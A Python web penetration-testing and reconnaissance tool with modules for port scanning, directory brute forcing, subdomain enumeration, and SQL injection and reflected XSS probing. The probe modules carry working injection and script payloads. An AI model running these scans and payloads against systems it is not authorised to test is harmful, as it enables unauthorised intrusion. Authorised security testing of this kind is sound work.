#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║   SPECTRAL RECON TOOLKIT v1.0                                ║
║   Web Penetration Testing & Reconnaissance Suite             ║
║   Author: R1z4l | DPH 2008                                   ║
║   ---------------------------------------------------------- ║
║   For authorized security testing only.                      ║
║   You break it, you bought it. Don't be stupid.              ║
╚══════════════════════════════════════════════════════════════╝

Usage:
    python recon_toolkit.py --target <url> [options]

Modules:
    --recon        Full recon (headers, whois, tech fingerprint)
    --portscan     TCP port scan (top 1000 or custom range)
    --dirbrute     Directory brute force
    --sqli         SQL injection probe on GET params
    --xss          Reflected XSS probe on GET params
    --subdomains   Subdomain enumeration
    --full         Run everything. Go nuclear.
"""

import argparse
import sys
import socket
import ssl
import json
import re
import time
import threading
import queue
import urllib.parse
import concurrent.futures
from http.client import HTTPConnection, HTTPSConnection
from collections import defaultdict


# ============================================================
#  COLORS — because we're not animals
# ============================================================
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    PURPLE = "\033[95m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

def banner():
    print(f"""{C.CYAN}{C.BOLD}
    ╔═╗╔═╗╔═╗╔═╗╔╦╗╦═╗╔═╗╦
    ╚═╗╠═╝║╣ ║   ║ ╠╦╝╠═╣║
    ╚═╝╩  ╚═╝╚═╝ ╩ ╩╚═╩ ╩╩═╝
    {C.RESET}{C.DIM}Spectral Recon Toolkit v1.0{C.RESET}
    {C.PURPLE}R1z4l — "Code is fiction until it executes."{C.RESET}
    """)

def log_info(msg):
    print(f"  {C.BLUE}[*]{C.RESET} {msg}")

def log_success(msg):
    print(f"  {C.GREEN}[+]{C.RESET} {msg}")

def log_warning(msg):
    print(f"  {C.YELLOW}[!]{C.RESET} {msg}")

def log_error(msg):
    print(f"  {C.RED}[-]{C.RESET} {msg}")

def log_vuln(msg):
    print(f"  {C.RED}{C.BOLD}[VULN]{C.RESET} {C.RED}{msg}{C.RESET}")

def section_header(title):
    width = 60
    print(f"\n  {C.CYAN}{'━' * width}{C.RESET}")
    print(f"  {C.CYAN}{C.BOLD}  {title}{C.RESET}")
    print(f"  {C.CYAN}{'━' * width}{C.RESET}\n")


# ============================================================
#  HTTP HELPER — raw and dirty, no requests library needed
# ============================================================
class RawHTTP:
    """
    Minimal HTTP client using stdlib only.
    No pip install needed. We ride raw.
    """
    @staticmethod
    def parse_url(url):
        parsed = urllib.parse.urlparse(url)
        scheme = parsed.scheme or "http"
        host = parsed.hostname
        port = parsed.port or (443 if scheme == "https" else 80)
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query
        return scheme, host, port, path

    @staticmethod
    def get(url, timeout=10, follow_redirects=True, max_redirects=5):
        """Perform a GET request. Returns (status, headers_dict, body)."""
        redirects = 0
        current_url = url

        while redirects <= max_redirects:
            scheme, host, port, path = RawHTTP.parse_url(current_url)
            try:
                if scheme == "https":
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    conn = HTTPSConnection(host, port, timeout=timeout, context=context)
                else:
                    conn = HTTPConnection(host, port, timeout=timeout)

                conn.request("GET", path, headers={
                    "Host": host,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Spectral/1.0",
                    "Accept": "*/*",
                    "Connection": "close",
                })
                resp = conn.getresponse()
                status = resp.status
                headers = {k.lower(): v for k, v in resp.getheaders()}
                body = resp.read().decode("utf-8", errors="replace")
                conn.close()

                if follow_redirects and status in (301, 302, 303, 307, 308):
                    location = headers.get("location", "")
                    if location:
                        if location.startswith("/"):
                            current_url = f"{scheme}://{host}:{port}{location}"
                        else:
                            current_url = location
                        redirects += 1
                        continue

                return status, headers, body

            except Exception as e:
                return None, {}, str(e)

        return None, {}, "Too many redirects"

    @staticmethod
    def head(url, timeout=10):
        """Perform a HEAD request. Returns (status, headers_dict)."""
        scheme, host, port, path = RawHTTP.parse_url(url)
        try:
            if scheme == "https":
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                conn = HTTPSConnection(host, port, timeout=timeout, context=context)
            else:
                conn = HTTPConnection(host, port, timeout=timeout)

            conn.request("HEAD", path, headers={
                "Host": host,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Spectral/1.0",
                "Connection": "close",
            })
            resp = conn.getresponse()
            status = resp.status
            headers = {k.lower(): v for k, v in resp.getheaders()}
            conn.close()
            return status, headers
        except Exception:
            return None, {}


# ============================================================
#  MODULE 1: RECONNAISSANCE
# ============================================================
def run_recon(target):
    section_header("RECONNAISSANCE")
    scheme, host, port, path = RawHTTP.parse_url(target)
    base = f"{scheme}://{host}:{port}"

    # --- DNS Resolution ---
    log_info(f"Resolving {host}...")
    try:
        ips = socket.getaddrinfo(host, port)
        seen = set()
        for info in ips:
            ip = info[4][0]
            if ip not in seen:
                log_success(f"IP: {ip} (family: {info[0].name})")
                seen.add(ip)
    except socket.gaierror as e:
        log_error(f"DNS resolution failed: {e}")
        return

    # --- HTTP Headers ---
    log_info("Fetching HTTP headers...")
    status, headers, body = RawHTTP.get(base, follow_redirects=False)

    if status:
        log_success(f"Status: {status}")
        print()

        # Security headers check
        security_headers = {
            "strict-transport-security": "HSTS",
            "content-security-policy": "CSP",
            "x-frame-options": "X-Frame-Options",
            "x-content-type-options": "X-Content-Type-Options",
            "x-xss-protection": "X-XSS-Protection",
            "referrer-policy": "Referrer-Policy",
            "permissions-policy": "Permissions-Policy",
        }

        log_info("Security Headers Analysis:")
        for hdr, name in security_headers.items():
            val = headers.get(hdr)
            if val:
                log_success(f"  {name}: {val}")
            else:
                log_warning(f"  {name}: MISSING")

        # Server fingerprint
        server = headers.get("server", "Not disclosed")
        powered = headers.get("x-powered-by", "Not disclosed")
        log_info(f"Server: {server}")
        log_info(f"X-Powered-By: {powered}")

        # Cookie analysis
        cookies = headers.get("set-cookie", "")
        if cookies:
            log_info("Cookies detected:")
            for cookie in cookies.split(","):
                cookie = cookie.strip()
                flags = []
                if "httponly" in cookie.lower():
                    flags.append(f"{C.GREEN}HttpOnly{C.RESET}")
                else:
                    flags.append(f"{C.RED}NO HttpOnly{C.RESET}")
                if "secure" in cookie.lower():
                    flags.append(f"{C.GREEN}Secure{C.RESET}")
                else:
                    flags.append(f"{C.RED}NO Secure{C.RESET}")
                if "samesite" in cookie.lower():
                    flags.append(f"{C.GREEN}SameSite{C.RESET}")
                else:
                    flags.append(f"{C.YELLOW}NO SameSite{C.RESET}")
                name_part = cookie.split("=")[0].strip() if "=" in cookie else cookie
                log_info(f"  {name_part} → {', '.join(flags)}")

        # Technology fingerprinting from body
        log_info("Technology Fingerprinting (body analysis):")
        tech_signatures = {
            "WordPress": ["wp-content", "wp-includes", "wordpress"],
            "Drupal": ["drupal", "sites/default/files"],
            "Joomla": ["joomla", "com_content"],
            "React": ["react", "_reactRoot", "__NEXT_DATA__"],
            "Angular": ["ng-version", "ng-app"],
            "Vue.js": ["vue", "__vue__"],
            "jQuery": ["jquery", "jQuery"],
            "Bootstrap": ["bootstrap"],
            "Laravel": ["laravel", "csrf-token"],
            "Django": ["csrfmiddlewaretoken", "django"],
            "ASP.NET": ["__viewstate", "asp.net"],
            "Express": ["express"],
        }
        body_lower = body.lower()
        detected = []
        for tech, sigs in tech_signatures.items():
            for sig in sigs:
                if sig.lower() in body_lower:
                    detected.append(tech)
                    break
        if detected:
            for tech in detected:
                log_success(f"  Detected: {tech}")
        else:
            log_info("  No common frameworks detected in response body")

    else:
        log_error(f"Could not connect to {base}")


# ============================================================
#  MODULE 2: PORT SCANNER
# ============================================================
def run_portscan(target, port_range=None):
    section_header("PORT SCAN")
    _, host, _, _ = RawHTTP.parse_url(target)

    # Top 50 most common ports if no range specified
    if port_range:
        start, end = map(int, port_range.split("-"))
        ports = list(range(start, end + 1))
    else:
        ports = [
            21, 22, 23, 25, 53, 80, 110, 111, 135, 139,
            143, 443, 445, 993, 995, 1723, 3306, 3389, 5432,
            5900, 5985, 8080, 8443, 8888, 9090, 27017,
        ]

    log_info(f"Scanning {host} — {len(ports)} ports")
    log_info(f"Threads: 50 | Timeout: 1.5s\n")

    open_ports = []
    lock = threading.Lock()

    def scan_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.5)
            result = sock.connect_ex((host, port))
            if result == 0:
                # Try to grab banner
                banner_text = ""
                try:
                    if port == 443 or port == 8443:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        ssock = context.wrap_socket(sock, server_hostname=host)
                        ssock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                        banner_text = ssock.recv(256).decode("utf-8", errors="replace").strip()
                        ssock.close()
                    else:
                        sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                        banner_text = sock.recv(256).decode("utf-8", errors="replace").strip()
                except Exception:
                    pass

                with lock:
                    open_ports.append((port, banner_text))
                    service = get_service_name(port)
                    log_success(f"Port {port:>5}/tcp  OPEN  ({service})")
                    if banner_text:
                        first_line = banner_text.split("\n")[0][:80]
                        log_info(f"         Banner: {first_line}")
            sock.close()
        except Exception:
            pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(scan_port, ports)

    print()
    log_info(f"Scan complete. {len(open_ports)} open port(s) found.")


def get_service_name(port):
    services = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
        53: "DNS", 80: "HTTP", 110: "POP3", 111: "RPCbind",
        135: "MSRPC", 139: "NetBIOS", 143: "IMAP", 443: "HTTPS",
        445: "SMB", 993: "IMAPS", 995: "POP3S", 1723: "PPTP",
        3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
        5900: "VNC", 5985: "WinRM", 8080: "HTTP-Alt",
        8443: "HTTPS-Alt", 8888: "HTTP-Alt", 9090: "HTTP-Alt",
        27017: "MongoDB",
    }
    return services.get(port, "unknown")


# ============================================================
#  MODULE 3: DIRECTORY BRUTE FORCE
# ============================================================
def run_dirbrute(target, wordlist=None):
    section_header("DIRECTORY BRUTE FORCE")
    scheme, host, port, _ = RawHTTP.parse_url(target)
    base = f"{scheme}://{host}:{port}"

    # Built-in wordlist if none provided
    if wordlist:
        try:
            with open(wordlist, "r") as f:
                dirs = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            log_error(f"Wordlist not found: {wordlist}")
            return
    else:
        dirs = [
            "admin", "administrator", "login", "wp-admin", "wp-login.php",
            "dashboard", "panel", "cpanel", "phpmyadmin", "mysql",
            "api", "api/v1", "api/v2", "graphql", "swagger",
            "config", "configuration", "setup", "install",
            "backup", "backups", "db", "database", "dump",
            "test", "testing", "dev", "debug", "staging",
            "uploads", "upload", "files", "images", "media",
            "static", "assets", "css", "js", "scripts",
            ".git", ".git/HEAD", ".env", ".htaccess", ".htpasswd",
            "robots.txt", "sitemap.xml", "crossdomain.xml",
            "server-status", "server-info", "info.php", "phpinfo.php",
            "wp-config.php.bak", "web.config", "config.yml",
            "console", "shell", "cmd", "terminal",
            ".svn", ".svn/entries", ".DS_Store", "Thumbs.db",
            "readme", "README.md", "CHANGELOG", "LICENSE",
            "cgi-bin", "cgi-bin/test", "xmlrpc.php",
            "vendor", "node_modules", "composer.json", "package.json",
            ".well-known", ".well-known/security.txt",
            "health", "healthcheck", "status", "metrics", "prometheus",
            "actuator", "actuator/health", "actuator/env",
            "trace", "heapdump",
        ]

    log_info(f"Target: {base}")
    log_info(f"Wordlist size: {len(dirs)} entries")
    log_info(f"Threads: 20\n")

    found = []
    lock = threading.Lock()

    def check_path(path):
        url = f"{base}/{path}"
        status, headers = RawHTTP.head(url, timeout=5)

        if status and status < 400:
            with lock:
                size = headers.get("content-length", "?")
                found.append((path, status, size))
                if status in (200, 204):
                    log_success(f"  /{path:<40} [{status}] Size: {size}")
                elif status in (301, 302, 303, 307):
                    location = headers.get("location", "?")
                    log_warning(f"  /{path:<40} [{status}] → {location}")
                else:
                    log_info(f"  /{path:<40} [{status}]")
        elif status == 403:
            with lock:
                found.append((path, status, "forbidden"))
                log_warning(f"  /{path:<40} [{status}] FORBIDDEN (exists but locked)")

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(check_path, dirs)

    print()
    log_info(f"Brute force complete. {len(found)} path(s) found.")


# ============================================================
#  MODULE 4: SQL INJECTION PROBE
# ============================================================
def run_sqli(target):
    section_header("SQL INJECTION PROBE")

    parsed = urllib.parse.urlparse(target)
    params = urllib.parse.parse_qs(parsed.query)

    if not params:
        log_warning("No GET parameters found in URL.")
        log_info("Provide a URL with parameters, e.g.:")
        log_info("  --target 'http://example.com/page?id=1&user=test'")
        return

    scheme, host, port, _ = RawHTTP.parse_url(target)
    base_path = parsed.path

    # SQLi payloads — classics that never die
    payloads = [
        ("Single quote", "'"),
        ("Double quote", '"'),
        ("OR true", "' OR '1'='1"),
        ("OR true (double)", '" OR "1"="1'),
        ("Union select", "' UNION SELECT NULL--"),
        ("Comment break", "'; --"),
        ("Time-based blind", "' OR SLEEP(3)--"),
        ("Error-based", "' AND 1=CONVERT(int,(SELECT @@version))--"),
        ("Boolean blind", "' AND 1=1--"),
        ("Boolean blind (false)", "' AND 1=2--"),
        ("Stacked query", "'; SELECT 1;--"),
    ]

    # Error signatures that indicate SQL injection
    error_signatures = [
        "sql syntax", "mysql", "sqlite", "postgresql", "oracle",
        "microsoft sql", "odbc", "syntax error", "unclosed quotation",
        "unterminated string", "division by zero", "you have an error",
        "quoted string not properly terminated", "sqlexception",
        "sql command not properly ended", "unexpected token",
        "invalid query", "database error", "db error",
        "warning: mysql", "warning: pg_", "warning: sqlite",
        "ora-", "pls-", "sp_executesql",
    ]

    log_info(f"Target: {target}")
    log_info(f"Parameters: {', '.join(params.keys())}")
    log_info(f"Payloads: {len(payloads)}\n")

    # Get baseline response
    log_info("Fetching baseline response...")
    base_status, _, base_body = RawHTTP.get(target)
    base_length = len(base_body) if base_body else 0
    log_info(f"Baseline: status={base_status}, length={base_length}\n")

    vulns_found = 0

    for param_name, param_values in params.items():
        original_val = param_values[0]
        log_info(f"Testing parameter: {C.BOLD}{param_name}{C.RESET} (original: {original_val})")

        for payload_name, payload in payloads:
            # Build the injected URL
            test_params = dict(params)
            test_params[param_name] = [original_val + payload]
            query_string = urllib.parse.urlencode(test_params, doseq=True)
            test_url = f"{scheme}://{host}:{port}{base_path}?{query_string}"

            start_time = time.time()
            status, headers, body = RawHTTP.get(test_url, timeout=15)
            elapsed = time.time() - start_time

            if status is None:
                continue

            body_lower = (body or "").lower()
            response_len = len(body or "")

            # Check for SQL error messages
            errors_found = [sig for sig in error_signatures if sig in body_lower]

            # Anomaly detection
            is_suspicious = False
            reasons = []

            if errors_found:
                is_suspicious = True
                reasons.append(f"SQL errors: {', '.join(errors_found[:3])}")

            if status != base_status:
                is_suspicious = True
                reasons.append(f"Status changed: {base_status} → {status}")

            # Significant length difference (> 20% change)
            if base_length > 0:
                diff_pct = abs(response_len - base_length) / base_length * 100
                if diff_pct > 20:
                    is_suspicious = True
                    reasons.append(f"Length delta: {diff_pct:.0f}%")

            # Time-based detection (response > 3 seconds for SLEEP payloads)
            if "SLEEP" in payload and elapsed > 3:
                is_suspicious = True
                reasons.append(f"Time delay: {elapsed:.1f}s (possible blind SQLi)")

            if is_suspicious:
                vulns_found += 1
                log_vuln(f"  [{payload_name}] on '{param_name}'")
                for reason in reasons:
                    log_warning(f"    → {reason}")

        print()

    if vulns_found == 0:
        log_info("No obvious SQL injection indicators found.")
        log_info("This doesn't mean it's safe — consider manual testing.")
    else:
        log_warning(f"{vulns_found} suspicious response(s) detected. Investigate further.")


# ============================================================
#  MODULE 5: XSS REFLECTION PROBE
# ============================================================
def run_xss(target):
    section_header("XSS REFLECTION PROBE")

    parsed = urllib.parse.urlparse(target)
    params = urllib.parse.parse_qs(parsed.query)

    if not params:
        log_warning("No GET parameters found in URL.")
        log_info("Provide a URL with parameters for XSS testing.")
        return

    scheme, host, port, _ = RawHTTP.parse_url(target)
    base_path = parsed.path

    # XSS payloads — testing for reflection
    canary = "SP3CTR4L"  # unique string to detect reflection
    payloads = [
        ("Plain reflection", f"{canary}"),
        ("Script tag", f"<script>{canary}</script>"),
        ("Event handler", f'<img src=x onerror=alert("{canary}")>'),
        ("SVG onload", f'<svg onload=alert("{canary}")>'),
        ("Attribute escape (dq)", f'"{canary}'),
        ("Attribute escape (sq)", f"'{canary}"),
        ("Tag break", f"</{canary}>"),
        ("JavaScript URI", f"javascript:alert('{canary}')"),
        ("Template literal", f"${{{canary}}}"),
        ("HTML entity bypass", f"&lt;script&gt;{canary}&lt;/script&gt;"),
    ]

    log_info(f"Target: {target}")
    log_info(f"Parameters: {', '.join(params.keys())}")
    log_info(f"Canary: {canary}")
    log_info(f"Payloads: {len(payloads)}\n")

    vulns_found = 0

    for param_name, param_values in params.items():
        original_val = param_values[0]
        log_info(f"Testing parameter: {C.BOLD}{param_name}{C.RESET}")

        for payload_name, payload in payloads:
            test_params = dict(params)
            test_params[param_name] = [payload]
            query_string = urllib.parse.urlencode(test_params, doseq=True)
            test_url = f"{scheme}://{host}:{port}{base_path}?{query_string}"

            status, headers, body = RawHTTP.get(test_url)

            if status is None or not body:
                continue

            # Check if our canary is reflected
            if canary in body:
                # Check if it's reflected with HTML context intact
                reflected_raw = payload in body
                reflected_encoded = urllib.parse.quote(payload) in body

                if reflected_raw:
                    vulns_found += 1
                    log_vuln(f"  [{payload_name}] REFLECTED RAW in '{param_name}'")
                    # Find the reflection context
                    idx = body.find(canary)
                    context = body[max(0, idx - 40):idx + len(canary) + 40]
                    context = context.replace("\n", " ").strip()
                    log_warning(f"    Context: ...{context}...")
                elif reflected_encoded:
                    log_info(f"  [{payload_name}] Reflected but URL-encoded (likely safe)")
                else:
                    log_info(f"  [{payload_name}] Canary found but payload modified")

            # Check for CSP header
            csp = headers.get("content-security-policy", "")
            if not csp and vulns_found > 0:
                log_warning(f"    No CSP header — XSS exploitation more likely")

        print()

    if vulns_found == 0:
        log_info("No reflected XSS found. Consider DOM-based XSS testing.")
    else:
        log_warning(f"{vulns_found} reflected payload(s) detected!")


# ============================================================
#  MODULE 6: SUBDOMAIN ENUMERATION
# ============================================================
def run_subdomains(target):
    section_header("SUBDOMAIN ENUMERATION")
    _, host, _, _ = RawHTTP.parse_url(target)

    # Strip www prefix if present
    if host.startswith("www."):
        host = host[4:]

    # Common subdomain prefixes
    prefixes = [
        "www", "mail", "ftp", "localhost", "webmail", "smtp",
        "pop", "ns1", "ns2", "dns", "dns1", "dns2",
        "mx", "mx1", "mx2", "docs", "git", "gitlab",
        "api", "dev", "staging", "stage", "test", "testing",
        "beta", "alpha", "demo", "sandbox", "preview",
        "admin", "administrator", "panel", "portal", "dashboard",
        "blog", "forum", "community", "support", "help",
        "shop", "store", "app", "mobile", "m",
        "cdn", "static", "assets", "media", "img", "images",
        "vpn", "remote", "gateway", "proxy", "lb",
        "db", "database", "mysql", "postgres", "redis", "mongo",
        "jenkins", "ci", "cd", "deploy", "build",
        "grafana", "prometheus", "kibana", "elastic",
        "status", "monitor", "health", "metrics",
        "internal", "intranet", "extranet", "corp",
        "backup", "bak", "old", "legacy", "archive",
        "auth", "sso", "login", "oauth", "id",
        "ws", "websocket", "socket", "realtime",
        "s3", "storage", "files", "upload",
    ]

    log_info(f"Domain: {host}")
    log_info(f"Prefixes: {len(prefixes)}")
    log_info(f"Method: DNS resolution (A record)\n")

    found = []
    lock = threading.Lock()

    def check_subdomain(prefix):
        subdomain = f"{prefix}.{host}"
        try:
            ips = socket.getaddrinfo(subdomain, 80, socket.AF_INET)
            ip = ips[0][4][0]
            with lock:
                found.append((subdomain, ip))
                log_success(f"  {subdomain:<40} → {ip}")
        except (socket.gaierror, socket.herror, OSError):
            pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        executor.map(check_subdomain, prefixes)

    print()
    log_info(f"Enumeration complete. {len(found)} subdomain(s) found.")

    # Group by IP to detect shared hosting
    if found:
        ip_map = defaultdict(list)
        for sub, ip in found:
            ip_map[ip].append(sub)

        shared = {ip: subs for ip, subs in ip_map.items() if len(subs) > 1}
        if shared:
            print()
            log_info("Shared IP addresses detected:")
            for ip, subs in shared.items():
                log_info(f"  {ip}: {', '.join(subs)}")


# ============================================================
#  RESULTS EXPORT
# ============================================================
def export_results(target, output_file):
    """Export scan metadata to JSON."""
    results = {
        "target": target,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
        "toolkit": "Spectral Recon Toolkit v1.0",
        "note": "Results exported. Review manually for false positives.",
    }
    try:
        with open(output_file, "w") as f:
            json.dump(results, f, indent=2)
        log_success(f"Results exported to {output_file}")
    except IOError as e:
        log_error(f"Failed to export: {e}")


# ============================================================
#  MAIN — WHERE THE MAGIC HAPPENS
# ============================================================
def main():
    parser = argparse.ArgumentParser(
        description="Spectral Recon Toolkit — Web Penetration Testing Suite",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python recon_toolkit.py --target http://example.com --recon
  python recon_toolkit.py --target http://example.com --portscan --ports 1-1024
  python recon_toolkit.py --target http://example.com --dirbrute
  python recon_toolkit.py --target http://example.com/page?id=1 --sqli
  python recon_toolkit.py --target http://example.com/search?q=test --xss
  python recon_toolkit.py --target http://example.com --subdomains
  python recon_toolkit.py --target http://example.com --full
        """
    )

    parser.add_argument("--target", "-t", required=True, help="Target URL")
    parser.add_argument("--recon", action="store_true", help="Run reconnaissance")
    parser.add_argument("--portscan", action="store_true", help="Run port scan")
    parser.add_argument("--ports", default=None, help="Port range (e.g., 1-1024)")
    parser.add_argument("--dirbrute", action="store_true", help="Run directory brute force")
    parser.add_argument("--wordlist", "-w", default=None, help="Custom wordlist for dir brute")
    parser.add_argument("--sqli", action="store_true", help="Run SQL injection probe")
    parser.add_argument("--xss", action="store_true", help="Run XSS reflection probe")
    parser.add_argument("--subdomains", action="store_true", help="Run subdomain enumeration")
    parser.add_argument("--full", action="store_true", help="Run all modules")
    parser.add_argument("--output", "-o", default=None, help="Export results to JSON file")

    args = parser.parse_args()

    banner()

    log_info(f"Target: {C.BOLD}{args.target}{C.RESET}")
    log_info(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print()

    # Normalize target
    target = args.target
    if not target.startswith("http"):
        target = "http://" + target

    run_any = False

    if args.full or args.recon:
        run_recon(target)
        run_any = True

    if args.full or args.portscan:
        run_portscan(target, args.ports)
        run_any = True

    if args.full or args.dirbrute:
        run_dirbrute(target, args.wordlist)
        run_any = True

    if args.full or args.sqli:
        run_sqli(target)
        run_any = True

    if args.full or args.xss:
        run_xss(target)
        run_any = True

    if args.full or args.subdomains:
        run_subdomains(target)
        run_any = True

    if not run_any:
        log_warning("No modules selected. Use --recon, --portscan, --dirbrute, --sqli, --xss, --subdomains, or --full")
        parser.print_help()
        return

    if args.output:
        export_results(target, args.output)

    section_header("SCAN COMPLETE")
    log_info(f"All selected modules finished for {target}")
    log_info("Remember: automated scans are just the start. Manual testing is king.")
    print()


if __name__ == "__main__":
    main()
